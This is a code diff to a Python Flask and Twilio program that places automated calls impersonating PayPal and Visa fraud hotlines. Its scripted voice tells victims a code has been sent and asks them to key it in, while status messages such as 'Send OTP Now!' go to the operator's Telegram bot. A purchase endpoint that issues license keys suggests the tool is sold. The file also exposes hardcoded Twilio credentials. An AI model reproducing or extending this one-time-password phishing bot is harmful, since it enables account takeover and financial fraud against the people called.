@@ -10,6 +10,16 @@ from twilio.twiml.voice_response import VoiceResponse, Gather,Client
 import json
 import requests
 #add more bots
+from flask import Flask, jsonify, request
+import uuid
+import sqlite3
+conn = sqlite3.connect('purchases.db')
+cursor = conn.cursor()
+cursor.execute('''CREATE TABLE IF NOT EXISTS purchases (
+                  id INTEGER PRIMARY KEY,
+                  product_type TEXT,
+                  one_time_code TEXT)''')
+conn.commit()
 account_sid = 'AC9d71968b6bf85d109997458622a27d9d'
 callid = None
 auth_token = '3de8ea71ad856404a743dac77709f8c7'
@@ -48,6 +58,58 @@ def voicepaypal():
         gather = Gather(num_digits=1, action='/voice/paypal?chanid=' + chanid, timeout=6)
         requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
         gather.say(f'Hello {name}, this is the PayPal fraud prevention hotline. We are calling to inform you about a request to change the number on this account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
+        resp.append(gather)
+        print('Call in progress')
+    return str(resp)
+@app.route('/purchase', methods=['POST'])
+def purchase():
+    data = request.get_json()
+    variant = data['ProductVariant']
+    external_url = variant['AsDynamic']['ExternalUrl']
+    one_time_code = uuid.uuid4().hex
+    
+    product_type = variant['Title']
+    conn = sqlite3.connect('purchases.db')
+    cursor = conn.cursor()
+    cursor.execute('INSERT INTO purchases (product_type, one_time_code) VALUES (?, ?)', (product_type, one_time_code))
+    conn.commit()
+    
+    # Construct the response
+    response_data = {
+        'Key': one_time_code
+    }
+    return jsonify(response_data)
+@app.route("/voice/vbv", methods=['GET', 'POST'])
+def voicevbv():
+    resp = VoiceResponse()
+    name = request.args.get('name')
+    chanid = request.args.get('chanid')
+    print(request.values)
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
+    if 'Digits' in request.values:
+        choice = request.values['Digits']
+        if choice == '1':
+            gather = Gather(num_digits=6, action='/validate?chanid=' + chanid, timeout=8)
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed Send OTP Now!"})
+            gather.say('We have sent you a 6 digit code. Please enter this code to block this request.', volume=2, voice="alice")
+            resp.append(gather)
+            print('Code sent')
+            return str(resp)
+        else:
+            resp.say("Sorry, I don't understand that choice.")
+    else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
+        gather = Gather(num_digits=1, action='/voice/vbv?chanid=' + chanid, timeout=6)
+        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
+        gather.say(f'Hello {name}, this is the Visa fraud prevention hotline. We are calling to inform you about a request to change the owner on this account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
         resp.append(gather)
         print('Call in progress')
     return str(resp)
